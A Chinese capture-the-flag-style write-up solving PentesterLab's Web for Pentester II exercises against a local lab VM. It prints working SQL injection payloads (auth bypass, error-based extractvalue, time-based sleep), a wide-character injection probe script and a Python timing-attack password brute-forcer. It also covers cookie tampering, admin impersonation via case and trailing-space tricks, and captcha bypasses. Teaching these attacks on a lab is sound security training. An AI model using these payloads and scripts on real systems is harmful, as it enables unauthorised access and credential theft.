# 【技术分享】Web for Pentester II练习题解
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
**Web for Pentester II ISO下载地址：**[
**https://pentesterlab.com/exercises/web_for_pentester_II/iso**
****](https://pentesterlab.com/exercises/web_for_pentester_II/iso)
**  
**
**作者：**[ **shinpachi8**
****](http://bobao.360.cn/member/contribute?uid=2812295712)
**预估稿费：300RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
**前言**
最近一直在找mongodb的注入练习，结果在penetsterlab上找到了。发现了其中的web for pentester 2,
其实我并没有做过第一版。有兴趣同学可以试着做做这一套练习包括：SQL注入，认证，授权，验证码,
覆盖属性，随机数问题，mongodb注入几部分。其中除随机数没有做出来，其他的都有解法。在[pentesterlab](https://pentesterlab.com/)上下载iso镜像直接用在虚拟机打开就可以了。我用的是virtualbox。
**SQL注入**
SQL注入就不多介绍了，搞安全的应该都知道。
1.最简单的一个，没有什么过滤，只要万能密码就可以绕过。
2.报错注入，
由上图可以看出，可能是根据返回的结果来进行判断，即如果返回就算通过。 那么用union来使返回结果为正，就可以绕过。
3\. 把单引号过滤了。只能想办法闭合单引号。试了试并没有过滤“”，由前边的经验我们可以知道，后台的sql语句可能还是
    select * from users where username=’param1’ and password=’param2’
那么可以这样来绕过。
    select * from users where username='' and password=' or 1=1#'
这时username的单引号被转义，所以被绕过了。
4\. 观察参数的形式，猜测可能是将参数直接代入where字段进行了查询，形式为： select * from users where [req
content] 这可以直接注入。放一个xml格式错误的报错 payload:
    username='hacker' and extractvalue(1, concat(0x5e7e5e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))#
更改 limit 与 concat()的内容可以将所有信息都查出来
5\. 由url形式可以推断出是在limit点的注入。这好像只可以用union来注入吧？如果有其他的方法的话请通知我…
在union的时候可能会对不同的数据库版本有不同的影响。总之先看这一个
出来了1,2 字段，其它的就和上边一样了。
说一下问题，我在 5.5.50版本的mariadb上是可以使用这个语法的。
但是在10.1.13的版本上不行.. 可能是和版本有关系。
    MariaDB [security]> select * from users limit 1 union select 1,2,3;
    ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT
    MariaDB [security]> select version();
    +-----------------+
    | version() |
    +-----------------+
    | 10.1.13-MariaDB |
    +-----------------+
    1 row in set (0.36 sec)
6\. 和第5差不多，只是将limit字段改成了group字段。注入手段是一样的。都可以用union来注入。
7\. 这个题出的很有意思，它将id对应username相同的值都返回了。可以基于时间来注入。由 and
if(length(database())=21,sleep(3),0) 由返回的结果时间长短来判断正确与否
8\. 是一个二次注入，如果我们使用用户名 如下：
那么可以得到如下结果
这样就可以得到想要信息了。
9\. 宽字符注入。剩下的就简单了。
写了一个脚本来判断哪些是可以进行宽字符注入时可用的字符
    def sql9():
        url = "http://10.108.40.237/sqlinjection/example9/?username=a%{}%27%20or%201=1%23&password=a&submit=Submit"
        for x in xrange(255):
            char = hex(x)[2:]
            if len(char) == 1:
                char = "0" + char
            html = requests.get(url.format(char))
            if "Success" in html.text:
                print "[+] 0x{} works".format(char)
        print "Done"
**认证**
对于认证来说，好多开发人员并没有正确了认证的本质，偶尔也会犯一些问题。
1\. http basic认证
虽然是个认证，但是是弱口令的问题..
2\. http basic认证
这个之前我是用的字典暴破,, 效率相当慢不说还不一定能找到,后来看到了官方的答解，说是用字符串的对比来实现的认证，即如果密码是password，
那么输入passwodd 的响应时间一定比passdddd时间长。因为字符串对比需要的时间长。这样的话就可以用脚本来暴破了。如下：
    def auth2():
        url = "http://192.168.60.114/authentication/example2/"
        # passwords = ["a", "b", "ac"]
        base_time = None
        password = ""
        passwords = string.lowercase + string.uppercase + string.digits
        # IPLIST={}
        while True:
            tmp_start = time.time()
            html = requests.get(url, auth=HTTPBasicAuth("hacker", password + "a"))
            base_time = time.time()-tmp_start
            for pwd in passwords:
                start = time.time()
                html = requests.get(url, auth=HTTPBasicAuth("hacker", password + pwd))
                used_time = time.time() - start
                if html.status_code == 200:
                    print "[*] FIND PASSWORD: {}".format(password + pwd)
                    return
                if used_time - base_time > 0.1:
                    password += pwd
                    print "[+] password: {} ..".format(password)
                    break
                elif base_time - used_time > 0.1:
                    password += "a"
                    print "[+] password: {} ..".format(password)
                    break
                print "Use Time: {}, password:{}".format(time.time()-start, password + pwd)
3\. 使用user1的帐号登录，认证为admin。
这个在设置代理之后，可以看到认证user1之后会在cookie字段有一个user:user1字段，改成admin之后就可以通过
4\. 目的与上一题一样，只是将cookie中的user字段由明文改成md5值
5\. 已经有一个admin用户，让我们认证它。 同时提供了一个注册的接口。 在mysql中，大小写不敏感，所以可以注册一个Admin 来绕过认证
6\. 题同第5个一样，不过这次转换成了小写，之前的手段不成功了。但是在mysql中会自动将后边的空格过滤掉，这样我们可以注册一个admin来绕过。
    MariaDB [blog]> insert user value (1, "admin", "admin")
        -> ;
    Query OK, 1 row affected (0.01 sec)
    MariaDB [blog]> select * from user;
    +----+----------+----------+
    | id | username | password |
    +----+----------+----------+
    |  1 | admin    | admin    |
    +----+----------+----------+
    1 row in set (0.00 sec)
    MariaDB [blog]> insert user value (1, "admin      ", "admin")
        -> ;
    ERROR 1062 (23000): Duplicate entry '1' for key 'PRIMARY'
    MariaDB [blog]> insert user value (2, "admin      ", "admin")
        -> ;
    Query OK, 1 row affected (0.00 sec)
    MariaDB [blog]> select * from user;
    +----+-------------+----------+
    | id | username    | password |
    +----+-------------+----------+
    |  1 | admin       | admin    |
    |  2 | admin       | admin    |
    +----+-------------+----------+
    2 rows in set (0.00 sec)
    MariaDB [blog]> select * from user where username="admin"
        -> ;
    +----+-------------+----------+
    | id | username    | password |
    +----+-------------+----------+
    |  1 | admin       | admin    |
    |  2 | admin       | admin    |
    +----+-------------+----------+
    2 rows in set (0.00 sec)
    MariaDB [blog]> select * from user where username="admin    "
        -> ;
    +----+-------------+----------+
    | id | username    | password |
    +----+-------------+----------+
    |  1 | admin       | admin    |
    |  2 | admin       | admin    |
    +----+-------------+----------+
    2 rows in set (0.00 sec)
**验证码**
1.这个很简单，只需要把验证码参数删掉就可以
看一下后台的代码：
2\. 这个也很简单，在表单中就有正确的captcha的内容。
3\. 这次在cookie中
4\. 这个其实并没有理解是什么意思… 只好把官方的答案放在这了。
This is quite a funny example, since it's a mistake I made during the
development of this set of exercises.